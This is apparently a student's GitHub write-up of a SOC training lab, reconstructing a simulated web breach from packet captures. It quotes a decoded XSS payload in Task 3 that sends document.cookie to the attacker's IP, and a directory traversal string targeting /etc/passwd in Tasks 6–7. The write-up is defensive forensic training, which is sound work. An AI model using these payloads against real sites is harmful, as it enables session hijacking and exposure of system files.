# CyberLabs SOC L1 – RetailBreach Investigation

<p align="center">
  <img src="https://img.shields.io/badge/Wireshark-Network%20Analysis-1679A7?style=for-the-badge&logo=wireshark&logoColor=white">
  <img src="https://img.shields.io/badge/CyberChef-URL%20Decoding-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/Markdown-README-black?style=for-the-badge&logo=markdown">
</p>

## Table of Contents

* [Overview](#overview)
* [What I Was Trying to Find](#what-i-was-trying-to-find)
* [Tools I Used](#tools-i-used)
* [Skills I Practiced](#skills-i-practiced)
* [Walking Through the Investigation](#walking-through-the-investigation)

  * [Task 1 – Finding the Attacker's IP](#task-1--finding-the-attackers-ip)
  * [Task 2 – What Tool Was Used for the Brute Force](#task-2--what-tool-was-used-for-the-brute-force)
  * [Task 3 – Finding the XSS Payload](#task-3--finding-the-xss-payload)
  * [Task 4 – When Did the Admin First Hit the Compromised Page](#task-4--when-did-the-admin-first-hit-the-compromised-page)
  * [Task 5 – Finding the Stolen Session Token](#task-5--finding-the-stolen-session-token)
  * [Task 6 – Which Script Got Exploited](#task-6--which-script-got-exploited)
  * [Task 7 – The Payload Used to Reach a Sensitive File](#task-7--the-payload-used-to-reach-a-sensitive-file)
* [Incident Timeline](#incident-timeline)
* [Key Findings](#key-findings)
* [How It All Fits Together](#how-it-all-fits-together)
* [What I Took Away From This](#what-i-took-away-from-this)
* [Repository Structure](#repository-structure)
* [Disclaimer](#disclaimer)
* [Connect](#connect)

---

## Overview

This is my write-up of the **RetailBreach** lab on **CyberLabs**, one of the L1 SOC investigation labs I completed as part of my cybersecurity learning journey.

The scenario involved a simulated web application compromise. I investigated the available network traffic to determine what happened, identify the attacker, understand how the application was compromised, and trace the actions that followed.

I used **Wireshark** for network traffic analysis and **CyberChef** to decode URL-encoded payloads during the investigation.

**Platform:** CyberLabs

**Lab:** RetailBreach

**Goal:** Investigate the incident from a SOC analyst perspective and reconstruct the attack chain using the available network traffic.

> **Note:** This investigation was completed in a controlled training environment. The actual session token has been redacted from this repository. Even in a lab environment, session tokens are authentication credentials, so I am treating them as sensitive information.

---

## What I Was Trying to Find

* The attacker's IP address
* The tool used to enumerate the website
* The XSS payload that was injected
* When the administrator first accessed the compromised page
* The stolen session token
* The vulnerable script that was exploited
* The exact directory traversal payload used to access a sensitive system file

---

## Tools I Used

| Tool          | Purpose                             |
| ------------- | ----------------------------------- |
| **Wireshark** | Network traffic and packet analysis |
| **CyberChef** | Decoding URL-encoded payloads       |

## Skills I Practiced

| Skill                                               | Status |
| --------------------------------------------------- | :----: |
| Reading network traffic and following conversations |    ✅   |
| Analysing HTTP requests                             |    ✅   |
| Following HTTP streams                              |    ✅   |
| Reading User-Agent strings                          |    ✅   |
| Investigating XSS                                   |    ✅   |
| URL decoding                                        |    ✅   |
| Building a timeline from timestamps                 |    ✅   |
| Session and cookie analysis                         |    ✅   |
| Investigating web attack activity                   |    ✅   |
| Identifying directory traversal                     |    ✅   |

---

# Walking Through the Investigation

## Task 1 – Finding the Attacker's IP

**What I was looking for:** Which IP address was responsible for the suspicious activity?

I went to **Statistics → Conversations** in Wireshark to examine the communication between hosts.

One IP address was generating significantly more traffic than it was receiving, making it a good candidate for further investigation.

**Finding:** `111.224.180.128`

![Task 1 - Attacker IP](screenshots/Task-01-attacker-ip-01.png)

**Figure 1: Wireshark Conversations showing the suspected attacker IP.**

![Task 1 - Attacker IP - Conversations](screenshots/Task-01-attacker-ip-02.png)

**Figure 2: Network conversation details supporting the attacker IP finding.**

**Takeaway:** Traffic volume and direction can help identify suspicious hosts before examining the contents of individual packets.

---

## Task 2 – What Tool Was Used for the Brute Force

**What I was looking for:** How was the attacker enumerating the website?

I filtered the traffic to show activity originating from the suspected attacker:

```text
ip.src == 111.224.180.128
```

This revealed a suspicious request:

```http
GET /.cvsignore HTTP/1.1
```

I followed the HTTP stream and examined the User-Agent header.

**Finding:** `Gobuster`

![Task 2 - Tool Used](screenshots/Task-02-tool-used-01.png)

**Figure 3: Filtered traffic showing activity from the suspected attacker.**

![Task 2 - Tool Used - User Agent](screenshots/Task-02-tool-used-02.png)

**Figure 4: User-Agent information identifying Gobuster.**

**Takeaway:** Enumeration tools may identify themselves through their User-Agent strings, making them useful indicators during network investigations.

---

## Task 3 – Finding the XSS Payload

**What I was looking for:** The malicious script injected by the attacker.

I filtered for traffic from the suspected attacker containing the word `script`:

```text
ip.src == 111.224.180.128 && http contains "script"
```

This led to a POST request involving `reviews.php`. I followed the HTTP stream and found that the payload was URL-encoded, so I used CyberChef to decode it.

**What I found:**

```html
<script>fetch('http://111.224.180.128/' + document.cookie);</script>
```

The payload attempts to access `document.cookie` and send the result to the attacker's IP address.

![Task 3 - XSS Payload](screenshots/Task-03-XSS-payload-01.png)

**Figure 5: HTTP request containing the XSS payload.**

![Task 3 - XSS Payload Decoded](screenshots/Task-03-XSS-payload-02.png)

**Figure 6: Decoded XSS payload showing `document.cookie` being sent to the attacker's IP.**

**Takeaway:** This investigation helped me connect XSS theory to what malicious activity actually looks like in network traffic. Seeing `document.cookie` being accessed and transmitted made the connection between XSS and session theft much clearer.

---

## Task 4 – When Did the Admin First Hit the Compromised Page

**What I was looking for:** The UTC timestamp of the administrator's first visit after the page had been compromised.

From Task 3, the XSS payload was injected at approximately **12:08 UTC**.

I then filtered for requests to `reviews.php` that did not originate from the attacker:

```text
ip.src != 111.224.180.128 && http.request.uri contains "reviews.php"
```

Two requests appeared: one at **11:50 UTC** and another at **12:09 UTC**.

The 11:50 request occurred before the XSS payload was injected, so it could not have triggered the malicious script.

The 12:09 request occurred after the injection and was therefore the relevant administrator visit.

**Finding:** `2024-03-29 12:09 UTC`

![Task 4 - Admin First Timestamp](screenshots/Task-04-Admin-First-Visit-Timestamp.png)

**Figure 7: Administrator request showing the first visit to the compromised page at 12:09 UTC.**

![Task 4 - XSS Timestamp](screenshots/Task-04-XSS-Injection-Timestamp.png)

**Figure 8: Timestamp showing when the XSS payload was injected.**

**Takeaway:** A timestamp becomes meaningful when it is correlated with other events. Comparing the XSS injection time with the administrator's requests helped establish the correct sequence of events.

---

## Task 5 – Finding the Stolen Session Token

**What I was looking for:** The session token exposed through the XSS attack.

I returned to the packet associated with the administrator's visit and followed the HTTP stream. I then examined the headers and found a `PHPSESSID` value.

**Finding:** `[REDACTED – LAB SESSION TOKEN]`

The actual token is not included in this repository because it is an authentication credential, even though it originated from a training environment.

![Task 5 - Stolen Session Token](screenshots/Task-05-Stolen-Session-Token.png)

**Figure 9: HTTP stream showing the stolen session token, with the sensitive value redacted.**

**Takeaway:** This connected the earlier XSS finding to the subsequent session activity. The injected JavaScript provided a mechanism for exposing the administrator's session information.

---

## Task 6 – Which Script Got Exploited

**What I was looking for:** What the attacker did after obtaining the stolen session.

I used the compromised session information to filter the attacker's traffic:

```text
ip.src == 111.224.180.128 && http && frame contains "<LAB_SESSION_TOKEN>"
```

This revealed requests to an administrative script:

```text
/admin/log_viewer.php?file=error.log
```

The attacker then attempted:

```text
/admin/log_viewer.php?file=../../../../../etc/passwd
```

This showed that the `file` parameter of `log_viewer.php` was being abused.

**Finding:** `log_viewer.php`

![Task 6 - Exploited Script](screenshots/Task-06-Exploited-Script-Log-Viewer-01.png)

**Figure 10: Request to the vulnerable `log_viewer.php` administrative script.**

![Task 6 - Exploited Script - Directory Traversal](screenshots/Task-06-Exploited-Script-Log-Viewer-02.png)

**Figure 11: Request showing the directory traversal attempt against the `file` parameter.**

**Takeaway:** Once the compromised session was identified, filtering the traffic by that session made it possible to trace the attacker's subsequent actions step by step.

---

## Task 7 – The Payload Used to Reach a Sensitive File

**What I was looking for:** The exact payload used to attempt access to a sensitive system file.

I continued examining traffic associated with the compromised session and the vulnerable script identified in Task 6.

The relevant request was:

```http
GET /admin/log_viewer.php?file=../../../../../etc/passwd HTTP/1.1
```

**Finding:**

```text
../../../../../etc/passwd
```

This is a directory traversal payload using repeated `../` sequences to move outside the application's intended directory and attempt to access `/etc/passwd`.

![Task 7 - Directory Traversal Payload](screenshots/Task-07-Directory-Traversal-Payload.png)

**Figure 12: Directory traversal payload targeting `/etc/passwd`.**

**Takeaway:** Identifying the vulnerable script and identifying the payload used to exploit it are two separate parts of the investigation.

---

# Incident Timeline

| Time                | What Happened                                                                            |
| ------------------- | ---------------------------------------------------------------------------------------- |
| **11:50 UTC**       | Legitimate visit to `reviews.php`, before the XSS payload was injected                   |
| **12:08 UTC**       | Attacker injects the XSS payload                                                         |
| **12:09 UTC**       | Administrator opens the compromised page                                                 |
| **After 12:09 UTC** | Stolen session is used for further attacker activity                                     |
| **Later**           | Attacker accesses `log_viewer.php` and attempts directory traversal toward `/etc/passwd` |

---

# Key Findings

| What I Was Looking For                          | What I Found                        |
| ----------------------------------------------- | ----------------------------------- |
| Attacker IP                                     | `111.224.180.128`                   |
| Enumeration tool                                | `Gobuster`                          |
| XSS payload                                     | `fetch()` sending `document.cookie` |
| Administrator's first visit to compromised page | `2024-03-29 12:09 UTC`              |
| Session token                                   | Redacted                            |
| Exploited script                                | `log_viewer.php`                    |
| Target file                                     | `/etc/passwd`                       |
| Directory traversal payload                     | `../../../../../etc/passwd`         |

---

# How It All Fits Together

Piecing the evidence together, the attack followed a clear sequence.

The attacker (`111.224.180.128`) began by using **Gobuster** to enumerate the web application. They then injected an XSS payload into `reviews.php` that attempted to send the victim's `document.cookie` to the attacker's IP address.

When the administrator opened the compromised page at **12:09 UTC**, the malicious script executed and exposed the administrator's `PHPSESSID`.

The attacker then used the compromised session to access the administrative `log_viewer.php` script. Finally, they attempted to abuse its `file` parameter using a directory traversal payload targeting `/etc/passwd`.

The overall attack chain can therefore be summarized as:

**Enumeration → XSS → Session Theft → Authenticated Access → Directory Traversal**

This was the main part of the investigation I wanted to understand: not just identifying individual indicators, but connecting them together to reconstruct the full attack sequence.

---

# Skills I Practiced

* Wireshark packet analysis
* Traffic conversation analysis
* HTTP request and stream analysis
* User-Agent identification
* XSS analysis
* URL decoding with CyberChef
* Timeline reconstruction
* Session and cookie analysis
* Web attack investigation
* Directory traversal analysis
* Incident documentation

---

# What I Took Away From This

This lab helped me become more comfortable using Wireshark to investigate an incident rather than simply following a tutorial.

The biggest lesson for me was that individual packets are useful, but the real value comes from connecting them into a timeline:

**This IP did this → which led to that → which explains what happened next.**

That is the part of network investigation that feels most relevant to SOC analyst work.

The lab also made the connection between XSS and session hijacking much more concrete. I had read about the concepts before, but seeing a cookie being accessed through `document.cookie` and then connecting that activity to the later use of the session made the attack chain much easier to understand.

My next goal is to work on a lab where I have to build the detection rule or alert myself instead of only investigating the incident after it has occurred.

---

# Repository Structure

```text
CyberLabs-SOC-L1-RetailBreach/
│
├── README.md
│
└── screenshots/
    │
    ├── Task-01-attacker-ip-01.png
    ├── Task-01-attacker-ip-02.png
    │
    ├── Task-02-tool-used-01.png
    ├── Task-02-tool-used-02.png
    │
    ├── Task-03-XSS-payload-01.png
    ├── Task-03-XSS-payload-02.png
    │
    ├── Task-04-Admin-First-Visit-Timestamp.png
    ├── Task-04-XSS-Injection-Timestamp.png
    │
    ├── Task-05-Stolen-Session-Token.png
    │
    ├── Task-06-Exploited-Script-Log-Viewer-01.png
    ├── Task-06-Exploited-Script-Log-Viewer-02.png
    │
    └── Task-07-Directory-Traversal-Payload.png
```

---

# Disclaimer

This project was completed in a controlled CyberLabs training environment for educational purposes.

All sensitive authentication information, including the session token, has been redacted before publishing.

---

# Connect

Thank you for taking the time to view this project.

I'm documenting my cybersecurity learning journey through hands-on labs covering networking, Linux, digital forensics, cloud computing, and SOC analysis.

Feel free to explore my other repositories to see what I'm learning next.
